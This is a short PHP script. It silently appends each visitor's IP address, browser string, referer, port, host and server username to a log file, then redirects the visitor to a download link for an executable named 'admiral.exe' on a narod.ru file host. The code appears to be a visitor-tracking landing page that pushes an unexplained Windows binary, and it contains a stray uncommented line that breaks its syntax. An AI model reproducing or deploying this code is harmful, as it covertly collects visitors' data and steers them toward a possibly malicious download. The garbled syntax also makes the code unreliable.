<?
  $a = $_SERVER['REMOTE_ADDR'];
  $b = $_SERVER['HTTP_USER_AGENT'];
  $c = @$_SERVER['HTTP_REFERER'];
  $d = $_SERVER['SERVER_PORT'];  
  $e = $_SERVER['HTTP_HOST'];
  $af = $_ENV['USERNAME'];
We dont need this comment !!! 
$count1=" IP: $a   br: $b   ot: $c  p: $d  h: $e  us: $af \n";
$f=fopen("log.txt","a+");
fwrite($f,$count1);  
fclose($f);  
?>
<?php
$ip = getenv ("REMOTE_ADDR");
$FL = fopen("log.txt", "a+");
fwrite($FL, $ip);
fclose($FL);
?>
<?php
header("Location: http://narod.ru/disk/8920597000/admiral.exe.html");
exit();
?> 
